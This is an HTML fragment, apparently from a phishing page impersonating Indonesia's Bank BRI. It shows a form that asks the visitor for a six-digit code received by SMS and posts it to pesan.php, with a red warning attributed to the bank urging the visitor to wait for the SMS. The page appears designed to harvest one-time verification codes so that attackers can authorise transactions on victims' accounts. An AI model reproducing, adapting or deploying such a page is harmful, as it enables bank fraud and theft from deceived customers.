        ...
        <div class="box-lte">
            ...
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
                    <p style="font-size: 15px; text-align: center; font-weight: bold;">Silahkan masukan Kode Tarif 6 angka Anda yang di kirim via SMS setelah bacaan adalah</br></p>
                    
                </div>
            </div>
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;">
                    <form method="post" action="pesan.php" class="sms-form">
                        <center>
                            <div style="margin-top: 10px">
                        <i class="ion-ios-locked-outline" id="ionIcons"></i>
                            <input name="sms" type="number" class="bubble-element Input form-log" placeholder="KODE TARIF 6 DIGIT" maxlength="6" Required><b>
                     <p style="font-size: 13px; text-align: center; margin-top: 30px;"><strong style="color: #FF0000;">Mohon jangan diisi jika belum menerima SMS kode tarif dari BANK BRI berupa 6 digit..!!</strong></p>       </center>
